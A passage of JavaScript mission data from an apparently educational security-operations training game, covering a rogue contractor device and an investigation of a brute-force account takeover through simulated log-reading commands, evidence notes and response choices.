        outcomeSub: 'You escalated the unknown device to leadership.',
        deltas: { executiveTrust: 10, careerReputation: 8, securityPosture: 4, complianceExposure: -6, businessContinuity: -2 },
        setFlags: [],
        deniedNote: 'Leadership sent it back — they want a clear recommendation, not just a hand-off.',
        consequence: {
          immediate: ['Escalated to SOC Lead with the asset-discovery findings and the contractor link.'],
          business: ['Senior review engaged; the containment decision sits with the right authority.'],
          future: ['Escalating with solid evidence builds trust for bigger calls later.'],
        },
      },
      {
        id: 'continue_investigation',
        type: 'direct',
        label: 'Continue Investigation',
        summary: 'Hold off on a response and keep gathering information.',
        outcomeSub: 'You chose to continue investigating before acting.',
        deltas: { securityPosture: -2, businessContinuity: 1, careerReputation: -2, complianceExposure: 3 },
        setFlags: ['rogueDeviceActive'],
        consequence: {
          immediate: ['No action taken yet; the device remains online while you gather more.'],
          business: ['Caution is fine early, but the evidence already supports acting — delay leaves exposure open.'],
          future: ['Slow-walking a clear finding is noted as indecision.'],
        },
      },
      {
        id: 'ignore',
        type: 'direct',
        label: 'Ignore',
        summary: 'Treat it as a false alarm and close the alert.',
        outcomeSub: 'You dismissed the alert.',
        deltas: { securityPosture: -20, complianceExposure: 25, businessContinuity: 3, careerReputation: -15, executiveTrust: -15 },
        setFlags: ['rogueDeviceActive'],
        consequence: {
          immediate: ['The unapproved contractor device stays on the finance segment, unmonitored.'],
          business: ['An unmanaged device with file-share access to finance is left in place — a standing breach risk.'],
          future: ['Dismissing a real finding badly damages trust in your judgment.'],
        },
      },
    ],

    lockedActions: [
      {
        id: 'reconfigure_firewall',
        label: 'Reconfigure Firewall / Network ACLs',
        reason: 'Cybersecurity Interns cannot push firewall or network access-control changes. That is a Network Administrator action.',
        alternativeRecommendationId: 'rec_network_isolation',
      },
      {
        id: 'seize_device',
        label: 'Physically Seize the Device',
        reason: 'Interns cannot seize hardware. Physical confiscation requires IT and HR involvement.',
        alternativeRecommendationId: 'rec_device_review',
      },
    ],

    recommendations: {
      rec_network_isolation: {
        label: 'Network Isolation Request',
        deltas: { securityPosture: 12, complianceExposure: -8, careerReputation: 6, businessContinuity: -2 },
        setFlags: ['rogueDeviceContained'],
        deniedNote: 'Networking declined to isolate the segment without a formal change request.',
        consequence: {
          immediate: ['Requested the network team isolate 192.168.1.57 from the internal segment.'],
          business: ['Contractor device cut off from finance resources pending proper provisioning.'],
          future: ['Tighter segmentation reduces exposure on later missions.'],
        },
      },
      rec_device_review: {
        label: 'Device Security Review',
        deltas: { securityPosture: 8, executiveTrust: 5, careerReputation: 6, complianceExposure: -5 },
        setFlags: [],
        deniedNote: 'Leadership deferred the device review for now.',
        consequence: {
          immediate: ['Requested IT and HR review the contractor'+"'"+'s device and access.'],
          business: ['Contractor device policy gaps flagged to the right owners.'],
          future: ['A documented review keeps the contractor on the radar for later missions.'],
        },
      },
    },
  },

  /* ================================================================== *
   * MISSION 3 — Investigate Suspicious Authentication Activity (COMMAND-MODEL)
   * Read simplified auth logs, recognize the brute-force → success → MFA-off
   * compromise pattern, identify WHICH account was taken over, and recommend
   * a response. Ties back to Mission 1 (A. Okafor, Finance) and the recurring
   * contractor. Behavior before terminology throughout.
   * ================================================================== */
  'mission-003': {
    id: 'mission-003',
    opId: 'OPS-2026-003',
    severity: 'HIGH',
    region: 'NA-EAST REGION',
    title: 'Investigate Suspicious Authentication Activity',
    threatClass: 'Authentication Security & Account Compromise',
    priority: 'P2 — HIGH',
    promptLabel: 'intern@cybercorp:~/authlogs$',
    carryFlags: [
      { key: 'credentialRiskHigh',           label: 'Confirmed credential-compromise incident on record' },
      { key: 'contractorAccountCompromised', label: 'Compromise tied to the recurring contractor' },
      { key: 'mfaRecommended',               label: 'MFA enforcement recommended' },
    ],
    supervisorMemory: [
      { when: { allOf: ['rogueDeviceActive'] }, tone: 'bad',
        text: "That rogue device you left on the network last case is still live — exactly the kind of quiet foothold that leads to a takeover like this. Stay sharp." },
      { when: { allOf: ['rogueDeviceContained'] }, tone: 'good',
        text: "Good thing you pulled that rogue device off the network last case. One less open door for whoever's behind this." },
      { when: { allOf: ['contractorDeviceLinked'] }, tone: 'neutral',
        text: "You already tied a device to that contractor. If the same name shows up in these auth logs, you'll know exactly what you're looking at." },
      { when: { allOf: ['sensitiveDataExposed'] }, tone: 'warn',
        text: "Leadership hasn't forgotten the data that left on your first case. A clean, well-evidenced call here rebuilds trust." },
    ],
    notebook: {
      hypotheses: [
        { label: 'This is a brute-force / credential-stuffing takeover, not a user mistake.', triggeredBy: ['ev_failures', 'ev_overview'] },
        { label: 'The attacker is operating from a location the real owner never uses.', triggeredBy: ['ev_location', 'ev_impossible'] },
        { label: 'The attacker disabled security controls to keep persistent access.', triggeredBy: ['ev_changes', 'ev_mfa_off'] },
        { label: 'The compromise traces back to the recurring contractor from earlier cases.', triggeredBy: ['ev_contractor_tie'] },
      ],
      unknowns: [
        { label: 'Did a login actually succeed, or were they all blocked?', resolvedBy: ['ev_success'] },
        { label: 'Did the attacker reach sensitive data once inside?', resolvedBy: ['ev_access'] },
        { label: 'Is the legitimate owner now locked out of their own account?', resolvedBy: ['ev_reset'] },
      ],
    },
    evidenceEmpty: 'No evidence yet. Use the terminal to read the authentication logs — each command can surface a new finding.',
    risks: [
      { id: 'risk_bruteforce',     label: 'Repeated failed logins indicate password guessing', triggeredBy: ['ev_failures'] },
      { id: 'risk_success_after',  label: 'A login succeeded immediately after the failures', triggeredBy: ['ev_success'] },
      { id: 'risk_foreign_login',  label: 'A successful login came from an unrecognized location', triggeredBy: ['ev_location'] },
      { id: 'risk_mfa_tamper',     label: 'Multi-factor authentication was turned off after the login', triggeredBy: ['ev_mfa_off', 'ev_changes'] },
      { id: 'risk_sensitive_access',label: 'The account accessed sensitive finance data after the login', triggeredBy: ['ev_access'] },
      { id: 'risk_contractor_tie', label: 'The activity ties back to the previously flagged contractor', triggeredBy: ['ev_contractor_tie'] },
    ],
    identify: {
      head: 'YOUR DETERMINATION',
      prompt: 'Which account has been compromised?',
      reviewLabel: 'Compromised account',
      note: 'Determination recorded — this is the account your recommendation will protect.',
      correctId: 'acct_okafor',
      options: [
        { id: 'acct_okafor',  label: 'a.okafor — Finance Controller' },
        { id: 'acct_reyes',   label: 's.reyes — SOC Lead' },
        { id: 'acct_brandt',  label: 'l.brandt — Staff Engineer' },
        { id: 'acct_demir',   label: 'contractor01 — J. Demir (contractor)' },
      ],
    },

    // Reactive identity/auth map — review-only, same engine as mission-002.
    // Nodes/links stay hidden until the terminal surfaces the matching
    // evidence; nothing is persisted or scored. Only the corporate sign-in /
    // alerting service is seeded (genuinely pre-known infrastructure). The
    // targeted account, the external attacker, the brute-force-then-success,
    // the impossible-travel session, the MFA-off state, the password reset /
    // lockout, the sensitive-data access and the contractor tie each appear
    // ONLY once their proving evidence is found — the map never names the
    // culprit or a finding early.
    map: {
      cap: 'IDENTITY & AUTH · SIGN-IN REVIEW — NA-EAST REGION',
      hint: 'Red marks the external source driving the takeover and the assets it reached. Select any node or connection for analyst intel.',
      nodes: {
        authsys: {
          x: 50, y: 10, glyph: '🔐', label: 'auth.cybercorp', sub: 'sign-in & alerting', seed: true, status: 'identified',
          intel: {
            what: 'The corporate sign-in service every account authenticates through — and the system that raised this login alert.',
            technique: 'It is the system under review — auth.log and the failed-login alert both originate here.',
            why: 'It records every login attempt and flags abnormal bursts, so all account activity is reviewed against it.' },
        },
        account: {
          x: 50, y: 40, glyph: '👤', label: 'a.okafor', sub: 'Finance Controller',
          revealBy: 'ev_overview', statusBy: { ev_overview: 'target' },
          intel: {
            what: 'The Finance Controller account named in the brief — the one the authentication alert fired on.',
            technique: 'Read the authentication log (cat auth.log) to see this account\u2019s failed-then-successful pattern.',
            why: 'It is the account under review; confirming whether it was taken over is the whole point of the case.' },
        },
        attacker: {
          x: 84, y: 20, glyph: '🌐', label: '203.0.113.44', sub: 'external source',
          revealBy: 'ev_overview', status: 'unknown', statusBy: { ev_failures: 'suspicious', ev_success: 'suspicious', ev_contractor_tie: 'suspicious' },
          intel: {
            what: 'The external source address behind this account\u2019s login attempts.',
            technique: 'It is the src on every failed and successful login in auth.log.',
            why: 'One outside address driving dozens of failures then a success is the signature of a credential attack.' },
        },
        homebase: {
          x: 14, y: 26, glyph: '🏢', label: 'London, UK', sub: 'usual session',
          revealBy: 'ev_location', status: 'identified',
          intel: {
            what: 'The account\u2019s usual London location, with a normal session open at the same time as the attack.',
            technique: 'cat login_locations.log — every prior login is London, and a concurrent London session is noted.',
            why: 'A real London session at the moment of a Lagos login proves the two cannot be the same person.' },
        },
        controls: {
          x: 16, y: 60, glyph: '🔑', label: 'MFA + sign-in', sub: 'account security',
          revealBy: 'ev_mfa_off', statusBy: { ev_mfa_off: 'target', ev_changes: 'target', ev_reset: 'target' },
          intel: {
            what: 'This account\u2019s multi-factor protection — now switched OFF.',
            technique: 'cat mfa_status.txt — MFA shows DISABLED; it was ENABLED until 03:21.',
            why: 'With MFA off, only the password is left guarding the account.' },
        },
        lockout: {
          x: 38, y: 78, glyph: '🔒', label: 'password reset', sub: 'owner locked out',
          revealBy: 'ev_reset', statusBy: { ev_reset: 'target' },
          intel: {
            what: 'The account password, reset from the attacker\u2019s address so the real owner is locked out.',
            technique: 'grep password_reset user_access.log — a reset issued from 203.0.113.44 (Lagos).',
            why: 'Resetting the password is how the intruder keeps control and stops the owner regaining access.' },
        },
        finance_data: {
          x: 68, y: 82, glyph: '💰', label: 'finance_share', sub: 'payroll · payments',
          revealBy: 'ev_access', statusBy: { ev_access: 'target' },
          intel: {
            what: 'The Finance share holding payroll and customer-payment data the compromised account opened.',
            technique: 'cat user_access.log — payroll and customer_payments opened, q3_compensation.csv downloaded.',
            why: 'It is the sensitive data now exposed through the takeover — the real impact of the incident.' },
        },
        contractor: {
          x: 86, y: 60, glyph: '👷', label: 'ext-contractor-07', sub: 'J. Demir (disabled)',
          revealBy: 'ev_contractor_tie', statusBy: { ev_contractor_tie: 'suspicious' },
          intel: {
            what: 'The recurring vendor (J. Demir / ext-contractor-07) whose own account was already disabled.',
            technique: 'cat contractor_activity.log — the attacking address maps to this contractor\u2019s prior sessions.',
            why: 'A blocked contractor pivoting to a stolen Finance login turns a one-off into a continuing campaign.' },
        },
      },
      links: [
        { a: 'account', b: 'authsys', revealBy: 'ev_overview',
          intel: {
            what: 'This account authenticates through the corporate sign-in service, where its login events are logged.',
            technique: 'cat auth.log — the account\u2019s login attempts are recorded here.',
            why: 'It is the normal login path; the attack shows up as abnormal events along this same path.' } },
        { a: 'attacker', b: 'account', revealBy: 'ev_overview', danger: true,
          intel: {
            what: 'Repeated failed logins followed by a success against this account, all from one external address.',
            technique: 'cat auth.log; grep failed auth.log and grep successful auth.log quantify the burst and the success.',
            why: 'A wave of failures ending in a success is a brute-force that worked — the moment of takeover.' } },
        { a: 'homebase', b: 'account', revealBy: 'ev_location',
          intel: {
            what: 'A legitimate London session for the same account, open at the time of the foreign login.',
            technique: 'cat login_locations.log — usual London logins plus a concurrent London session.',
            why: 'A real London session running while a login arrives from a never-used place means the foreign login is someone else.' } },
        { a: 'attacker', b: 'controls', revealBy: 'ev_changes', danger: true,
          intel: {
            what: 'Right after logging in, the intruder disabled MFA, added mail forwarding and changed the password.',
            technique: 'cat account_changes.log — MFA off (03:21), mail-forward added, password changed, all from 203.0.113.44.',
            why: 'Altering these settings strips the account\u2019s defences and cements the takeover.' } },
        { a: 'attacker', b: 'lockout', revealBy: 'ev_reset', danger: true,
          intel: {
            what: 'The intruder reset the account password from its own address, locking the real owner out.',
            technique: 'grep password_reset user_access.log — reset issued from 203.0.113.44 (Lagos).',
            why: 'A password reset from the attacker\u2019s location is persistence — the owner can no longer get back in.' } },
        { a: 'account', b: 'finance_data', revealBy: 'ev_access', danger: true,
          intel: {
            what: 'After the takeover the account opened payroll and customer-payment data and downloaded a compensation file.',
            technique: 'cat user_access.log — sensitive Finance reads plus a q3_compensation.csv download.',
            why: 'It shows the attacker using the trusted account to reach exactly the sensitive data that matters.' } },
        { a: 'attacker', b: 'contractor', revealBy: 'ev_contractor_tie', danger: true,
          intel: {
            what: 'The attacking address traces back to the recurring contractor whose own account was disabled.',
            technique: 'cat contractor_activity.log — src 203.0.113.44 maps to ext-contractor-07 (J. Demir).',
            why: 'It ties this takeover to the earlier cases — the same actor escalating rather than a stranger.' } },
      ],
    },

    intro: [
      { t: 'CyberCorp SOC // Career Operating Center — Authentication Review', c: 'head' },
      { t: 'The login system flagged a burst of failed sign-ins followed by a success.', c: 'dim' },
      { t: 'Read the logs, work out what happened, and find the account that was taken over.', c: 'dim' },
      { t: 'Type  cat auth.log  to start, then  help  for the full command list.', c: 'dim' },
    ],
    brief: {
      situation:
        'Overnight, the authentication system flagged an unusual pattern on a Finance ' +
        'account: a wave of failed logins, then a success — from a place the user has ' +
        'never signed in from. Read the authentication logs, reconstruct what happened ' +
        'in order, decide whether this is a real account takeover, and identify exactly ' +
        'which account is compromised.',
      objectives: [
        'Reconstruct the login pattern from the authentication logs',
        'Check where the successful login came from',
        'Look for changes made to the account after the login',
        'Identify the compromised account — then recommend a response',
      ],
      managerNote:
        '"Same Finance name from your first case — A. Okafor. Could be nothing, could be ' +
        'someone reusing what they learned. Read the logs in order: failures, success, ' +
        'then what they did next. Recommend the response; you don'+"'"+'t reset credentials ' +
        'org-wide yourself. — Sarah Reyes, SOC Lead"',
    },

    commands: [
      {
        id: 'cat_authlog',
        match: ['cat auth.log', 'cat authlog', 'less auth.log'],
        help: 'read the authentication log',
        core: true,
        output: [
          { t: 'auth.log — last 24h (summary)', c: 'head' },
          '  03:11  a.okafor   LOGIN FAILED   src 203.0.113.44',
          '  03:11  a.okafor   LOGIN FAILED   src 203.0.113.44',
          '  03:12  a.okafor   LOGIN FAILED   src 203.0.113.44',
          '  ... (many more failures) ...',
          '  03:19  a.okafor   LOGIN SUCCESS  src 203.0.113.44',
        ],
        reveals: ['ev_overview'],
        observation: 'One account — a.okafor — shows a stack of failed logins and then a success, all from the same outside address.',
        question: 'Many failures, then a success, all from one source — what does that pattern usually mean?',
        next: 'count the failures on their own — type  grep failed auth.log',
      },
      {
        id: 'grep_failed',
        match: ['grep failed auth.log', 'grep failed', 'grep failed auth'],
        help: 'show only the failed login attempts',
        core: true,
        output: [
          { t: 'grep failed auth.log — a.okafor', c: 'head' },
          '  47 LOGIN FAILED entries for a.okafor between 03:11 and 03:18',
          '  all from src 203.0.113.44 (single external address)',
        ],
        reveals: ['ev_failures'],
        observation: '47 failed attempts in seven minutes from one address — far too fast and too many for a human typo.',
        question: 'Does a person fail to log in 47 times in seven minutes? Or is something automated?',
        next: 'find the one that worked — type  grep successful auth.log',
      },
      {
        id: 'grep_successful',
        match: ['grep successful auth.log', 'grep success auth.log', 'grep successful'],
        help: 'show the successful logins',
        core: true,
        output: [
          { t: 'grep successful auth.log — a.okafor', c: 'head' },
          '  03:19  a.okafor   LOGIN SUCCESS  src 203.0.113.44',
          '  # the success comes immediately after the 47 failures, same source',
        ],
        reveals: ['ev_success'],
        observation: 'The successful login lands seconds after the failed burst, from the very same address — the guessing worked.',
        question: 'If the failures were an attacker guessing, who just got in?',
        next: 'see where that login came from — type  cat login_locations.log',
      },
      {
        id: 'cat_locations',
        match: ['cat login_locations.log', 'cat login_locations', 'less login_locations.log'],
        help: 'read the login-location history',
        core: true,
        output: [
          { t: 'login_locations.log — a.okafor', c: 'head' },
          '  usual:   London, UK (office) — every prior login',
          '  03:19:   Lagos, NG — NEW location, never seen before',
          '  # 03:05 a.okafor also had a normal London session open at the same time',
        ],
        reveals: ['ev_location'],
        observation: 'The successful login came from a country a.okafor has never signed in from — while a normal London session was already active.',
        question: 'One person cannot be in two countries at once — so who is the second login?',
        next: 'focus the location log on the odd one — type  grep unknown login_locations.log',
      },
      {
        id: 'grep_unknown',
        match: ['grep unknown login_locations.log', 'grep unknown', 'grep unknown login_locations'],
        help: 'highlight the unrecognized location',
        output: [
          'login_locations.log:  03:19  a.okafor  Lagos, NG  device: unknown  status: UNRECOGNIZED',
          'login_locations.log:  note: ~5,000 km from the active London session 14 minutes earlier',
        ],
        reveals: ['ev_impossible'],
        observation: 'The two sessions are thousands of kilometres apart, minutes apart — physically impossible for one person.',
        question: 'What does it tell you when one account is logged in from two impossible places at once?',
        next: 'see what changed on the account after they got in — type  cat account_changes.log',
      },
      {
        id: 'cat_changes',
        match: ['cat account_changes.log', 'cat account_changes', 'less account_changes.log'],
        help: 'read changes made to the account',
        core: true,
        output: [
          { t: 'account_changes.log — a.okafor (after 03:19)', c: 'head' },
          '  03:21  MFA DISABLED            by a.okafor (src 203.0.113.44)',
          '  03:22  mail forwarding ADDED   → external address',
          '  03:24  password CHANGED        (src 203.0.113.44)',
        ],
        reveals: ['ev_changes'],
        observation: 'Right after logging in, "a.okafor" turned off MFA, added mail forwarding, and changed the password — classic takeover housekeeping.',
        question: 'Why would the real owner disable their own MFA and forward their mail at 3am?',
        next: 'confirm MFA is now off — type  cat mfa_status.txt',
      },
      {
        id: 'cat_mfa',
        match: ['cat mfa_status.txt', 'cat mfa_status', 'less mfa_status.txt'],
        help: 'check the current MFA status',
        output: [
          { t: 'mfa_status.txt — a.okafor', c: 'head' },
          '  MFA: DISABLED  (was ENABLED until 03:21 today)',
          '  # with MFA off, only the now-changed password protects the account',
        ],
        reveals: ['ev_mfa_off'],
        observation: 'MFA is currently OFF — the one control that would have blocked a stolen password has been removed.',
        question: 'With MFA off and the password changed, who actually controls this account now?',
        next: 'see what the account touched after takeover — type  cat user_access.log',
      },
      {
        id: 'cat_access',
        match: ['cat user_access.log', 'cat user_access', 'less user_access.log'],
        help: 'read what the account accessed',
        core: true,
        output: [
          { t: 'user_access.log — a.okafor (after 03:19)', c: 'head' },
          '  03:26  opened  finance_share/payroll/',
          '  03:28  opened  finance_share/customer_payments/',
          '  03:31  downloaded  q3_compensation.csv',
        ],
        reveals: ['ev_access'],
        observation: 'The compromised account went straight for payroll and customer-payment data — the same sensitive finance files from your first case.',
        question: 'The attacker is now inside Finance with a trusted account — what is at stake?',
        next: 'check who reset the password — type  grep password_reset user_access.log',
      },
      {
        id: 'grep_reset',
        match: ['grep password_reset user_access.log', 'grep password_reset', 'grep password_reset user_access'],
        help: 'search for the password reset event',
        output: [
          'user_access.log:  03:24  password_reset  performed from src 203.0.113.44 (Lagos, NG)',
          'user_access.log:  # the attacker, not the user, now holds the working password',
        ],
        reveals: ['ev_reset'],
        observation: 'The password was reset from the attacker'+"'"+'s address — the real owner is now locked out of their own account.',
        question: 'If the attacker reset the password, will the real user even notice they are locked out?',
        next: 'trace the source address — type  cat contractor_activity.log',
      },
      {
        id: 'cat_contractor',
        match: ['cat contractor_activity.log', 'cat contractor_activity', 'less contractor_activity.log'],
        help: 'read the contractor activity log',
        core: true,
        output: [
          { t: 'contractor_activity.log', c: 'head' },
          '  src 203.0.113.44 previously seen: ext-contractor-07 (J. Demir) remote sessions',
          '  contractor01 (J. Demir) account: DISABLED after the data-handling review',
          '  # same source address as the earlier contractor incidents',
        ],
        reveals: ['ev_contractor_tie'],
        observation: 'The attacking address traces back to the same contractor flagged in your earlier cases — whose own account was already disabled, so they pivoted to a.okafor.',
        question: 'A blocked contractor reappears by stealing a Finance login — is this opportunism, or a campaign?',
        next: 'check the policy for this pattern — type  cat authentication_policy.txt',
      },
      {
        id: 'cat_policy',
        match: ['cat authentication_policy.txt', 'cat authentication_policy', 'less authentication_policy.txt'],
        help: 'read the authentication policy',
        output: [
          { t: 'authentication_policy.txt', c: 'head' },
          '  Repeated failures + login from a new location + MFA change = treat as COMPROMISE.',
          '  Response: reset credentials, re-enable MFA, lock if needed, and escalate to IR.',
        ],
        reveals: ['ev_policy'],
        observation: 'Policy says this exact pattern is treated as a confirmed compromise — with a defined response.',
        question: 'You have the pattern and the policy — what is the right response to protect the account?',
        next: 'see the correlated alert — type  tail security_events.log',
      },
      {
        id: 'tail_security',
        match: ['tail security_events.log', 'cat security_events.log', 'less security_events.log'],
        help: 'read the correlated security alert',
        core: true,
        output: [
          { t: 'security_events.log — correlated', c: 'head' },
          '  ALERT: credential brute-force → success → MFA tamper on a.okafor',
          '  confidence: HIGH   recommended: contain account, reset, escalate to IR',
        ],
        reveals: ['ev_correlated'],
        observation: 'The system has already correlated the whole chain into a single high-confidence account-compromise alert.',
        question: 'The evidence all points one way — are you ready to name the account and act?',
        next: 'confirm the user could not have done this — type  cat manager_notes.txt',
      },
      {
        id: 'cat_manager',
        match: ['cat manager_notes.txt', 'cat manager_notes', 'less manager_notes.txt'],
        help: 'read the manager'+"'"+'s notes',
        output: [
          { t: 'manager_notes.txt', c: 'head' },
          '  "A. Okafor is on leave this week and is in London — definitely did not log in from Lagos."',
          '  "She never disables her MFA. Please treat this as not her."',
        ],
        reveals: ['ev_manager'],
        observation: 'The manager confirms the real owner was elsewhere and would never disable MFA — ruling out a legitimate explanation.',
        question: 'With the owner ruled out, the only explanation left is takeover — what do you recommend?',
        next: 'you have the full picture — type  decide  to choose your response',
      },
    ],

    evidence: [
      {
        id: 'ev_overview', label: 'One account shows failed logins then a success, all from one outside address.',
        qualityWeight: 1, source: 'auth.log',
        layers: {
          beginner: {
            summary: 'The log shows one account failing to log in many times, then succeeding — all from the same outside address.',
            why: 'A burst of failures followed by a success is a common sign someone is guessing a password.',
            prompt: 'Many failures then a success from one source — what does that usually mean?',
          },
          analyst: 'auth.log: a.okafor — clustered LOGIN FAILED then LOGIN SUCCESS, single external src 203.0.113.44.',
          technical: 'auth.log — a.okafor failed-auth cluster culminating in success, src 203.0.113.44 throughout.',
          terms: ['authentication'],
        },
      },
      {
        id: 'ev_failures', label: '47 failed logins in 7 minutes from one external address.',
        qualityWeight: 3, source: 'grep failed auth.log',
        layers: {
          beginner: {
            summary: 'The account failed to log in 47 times in just seven minutes, all from one outside address.',
            why: 'No person types their password wrong 47 times that fast — this is automated guessing.',
            prompt: 'Does a real person fail 47 times in seven minutes, or is this a machine?',
          },
          analyst: '47 failed auths for a.okafor in ~7 min from 203.0.113.44 — high-rate credential brute-force.',
          technical: 'grep failed auth.log — 47 failures 03:11–03:18, single src 203.0.113.44; automated brute-force signature.',
          terms: ['bruteForce', 'authentication'],
        },
      },
      {
        id: 'ev_success', label: 'A login succeeded immediately after the failed burst, same source.',
        qualityWeight: 2, source: 'grep successful auth.log',
        layers: {
          beginner: {
            summary: 'Right after all those failures, one login finally worked — from the same outside address.',
            why: 'A success at the end of a guessing burst means the attacker found the password.',
            prompt: 'If the failures were guessing, who just successfully got in?',
          },
          analyst: 'Successful auth at 03:19 immediately follows the failure cluster, same src — brute-force succeeded.',
          technical: 'grep successful auth.log — 03:19 SUCCESS, src 203.0.113.44; terminal success of the brute-force run.',
          terms: ['bruteForce'],
        },
      },
      {
        id: 'ev_location', label: 'The successful login came from a location the user has never used.',
        qualityWeight: 3, source: 'login_locations.log',
        layers: {
          beginner: {
            summary: 'The login that worked came from a country the user has never signed in from before.',
            why: 'A first-ever login location, at the exact moment of a break-in, points to someone else.',
            prompt: 'One person cannot be in two countries at once — so who is the second login?',
          },
          analyst: 'a.okafor habitual geo = London; 03:19 success geolocates to Lagos, NG — novel location during an active London session.',
          technical: 'login_locations.log — anomalous geo (Lagos, NG) vs baseline (London); concurrent London session present.',
          terms: ['authentication'],
        },
        reflection: {
          title: 'REVIEW THE SUSPICIOUS LOGIN',
          prompt: 'What concerns you about this activity? (Tick anything that stands out.)',
          concerns: [
            'Dozens of failed logins in a few minutes',
            'A success right after the failures, from the same address',
            'The login came from a location the user has never used',
            'The account is logged in from two places at once',
            'This looks like the user just travelling',
            'I need more information before deciding',
          ],
          judgmentPrompt: 'Based on what you found, how would you judge this activity?',
          feedback: 'There is no single right answer — analysts reason from what they observe. The PATTERN (failures → success), the PLACE (a new country), and the TIMING (two places at once) together make the case.',
        },
      },
      {
        id: 'ev_impossible', label: 'Two sessions thousands of km apart, minutes apart — physically impossible.',
        qualityWeight: 2, source: 'grep unknown login_locations.log',
        layers: {
          beginner: {
            summary: 'The account was logged in from two places thousands of kilometres apart, only minutes apart.',
            why: 'No one can travel that far that fast — so the two logins are two different people.',
            prompt: 'What does it mean when one account is in two impossible places at once?',
          },
          analyst: 'Impossible-travel: ~5,000 km between concurrent London and Lagos sessions, ~14 min apart.',
          technical: 'login_locations.log — geo-velocity violation (London↔Lagos, ~14 min); concurrent-session anomaly.',
          terms: ['impossibleTravel'],
        },
      },
      {
        id: 'ev_changes', label: 'After login, MFA was disabled, mail forwarding added, and the password changed.',
        qualityWeight: 3, source: 'account_changes.log',
        layers: {
          beginner: {
            summary: 'Right after logging in, the account turned off its security check, set up mail forwarding, and changed its password.',
            why: 'These are the moves an attacker makes to keep control and hide — not what an owner does at 3am.',
            prompt: 'Why would the real owner disable their own MFA and forward their mail in the middle of the night?',
          },
          analyst: 'Post-auth: MFA disabled, external mail-forward rule added, password rotated — attacker persistence + exfil setup.',
          technical: 'account_changes.log — 03:21 MFA off, 03:22 forward→external, 03:24 password change, all src 203.0.113.44.',
          terms: ['mfa', 'credentialCompromise'],
        },
      },
      {
        id: 'ev_mfa_off', label: 'MFA is now OFF — it was enabled until the attack.',
        qualityWeight: 2, source: 'mfa_status.txt',
        layers: {
          beginner: {
            summary: 'The account'+"'"+'s extra security check is now switched off; it was on until this happened.',
            why: 'With MFA off, only the password protects the account — and the attacker just changed that too.',
            prompt: 'With MFA off and the password changed, who actually controls this account now?',
          },
          analyst: 'a.okafor MFA state flipped ENABLED→DISABLED at 03:21; sole remaining factor (password) attacker-controlled.',
          technical: 'mfa_status.txt — MFA DISABLED (since 03:21); single-factor exposure post-takeover.',
          terms: ['mfa'],
        },
      },
      {
        id: 'ev_access', label: 'The account then opened payroll and customer-payment data and downloaded a file.',
        qualityWeight: 3, source: 'user_access.log',
        layers: {
          beginner: {
            summary: 'After the break-in, the account opened payroll and customer-payment files and downloaded one.',
            why: 'These are the same sensitive finance files from your first case — now in an attacker'+"'"+'s hands.',
            prompt: 'The attacker is inside Finance with a trusted account — what is at stake?',
          },
          analyst: 'Post-compromise access to finance_share payroll + customer_payments; exfil of q3_compensation.csv.',
          technical: 'user_access.log — 03:26–03:31 sensitive finance reads + download (q3_compensation.csv) under compromised account.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_reset', label: 'The password was reset from the attacker'+"'"+'s address — owner locked out.',
        qualityWeight: 2, source: 'grep password_reset user_access.log',
        layers: {
          beginner: {
            summary: 'The password was reset from the attacker'+"'"+'s location, so the real owner is now locked out.',
            why: 'Changing the password is how the attacker keeps control and stops the owner getting back in.',
            prompt: 'If the attacker reset the password, will the real user even notice they are locked out?',
          },
          analyst: 'password_reset executed from 203.0.113.44 (Lagos) — attacker secures persistence, denies legitimate access.',
          technical: 'grep password_reset user_access.log — reset from attacker src; owner lockout, attacker persistence.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_contractor_tie', label: 'The attacking address traces back to the recurring contractor (J. Demir).',
        qualityWeight: 3, source: 'contractor_activity.log', setFlag: 'contractorAccountCompromised',
        layers: {
          beginner: {
            summary: 'The attacker'+"'"+'s address is the same one tied to the contractor from your earlier cases — whose own account was already disabled.',
            why: 'A blocked contractor stealing a Finance login suggests this is the same person escalating, not a random attacker.',
            prompt: 'A blocked contractor reappears through a stolen login — opportunism, or a campaign?',
          },
          analyst: 'src 203.0.113.44 historically maps to ext-contractor-07 (J. Demir); contractor01 disabled — pivot to a.okafor.',
          technical: 'contractor_activity.log — 203.0.113.44 ↔ ext-contractor-07 prior sessions; disabled contractor account → credential pivot.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_policy', label: 'Policy treats failures + new location + MFA change as a confirmed compromise.',
        qualityWeight: 1, source: 'authentication_policy.txt',
        layers: {
          beginner: {
            summary: 'The rules say this exact combination of signs is treated as a real account takeover.',
            why: 'Knowing the policy turns the pattern you found into a clear, required response.',
            prompt: 'You have the pattern and the policy — what response protects the account?',
          },
          analyst: 'Auth policy: brute-force + new-geo + MFA change = compromise; mandates reset, MFA re-enable, lock, IR escalation.',
          technical: 'authentication_policy.txt — defined compromise criteria + response (credential reset, MFA enforce, lock, escalate).',
          terms: ['authentication', 'mfa'],
        },
      },
      {
        id: 'ev_correlated', label: 'The SIEM correlated the whole chain into one high-confidence compromise alert.',
        qualityWeight: 2, source: 'security_events.log', setFlag: 'credentialRiskHigh',
        layers: {
          beginner: {
            summary: 'The security system has already linked all the steps into a single high-confidence takeover alert.',
            why: 'Independent confirmation that the separate clues add up to one account-compromise incident.',
            prompt: 'The evidence all points one way — are you ready to name the account and act?',
          },
          analyst: 'Correlated alert: brute-force → success → MFA tamper on a.okafor, HIGH confidence; recommends contain + reset + IR.',
          technical: 'security_events.log — multi-signal correlation (auth + geo + MFA) → HIGH-confidence account-compromise.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_manager', label: 'The manager confirms the owner was elsewhere and never disables MFA.',
        qualityWeight: 1, source: 'manager_notes.txt',
        layers: {
          beginner: {
            summary: 'The manager confirms the real owner was on leave in London and would never turn off her MFA.',
            why: 'This rules out an innocent explanation — the activity cannot be the legitimate user.',
            prompt: 'With the owner ruled out, the only explanation left is takeover — what do you recommend?',
          },
          analyst: 'Manager attestation: owner in London/on leave, no self-initiated MFA disable — legitimate-use hypothesis excluded.',
          technical: 'manager_notes.txt — owner alibi + behavioral baseline contradict the session; confirms unauthorized actor.',
          terms: [],
        },
      },
    ],

    actions: [
      {
        id: 'lock_account',
        type: 'recommendation',
        label: 'Recommend Account Lock',
        summary: 'Recommend immediately locking the compromised account to cut off the attacker.',
        outcomeSub: 'You recommended locking the compromised account.',
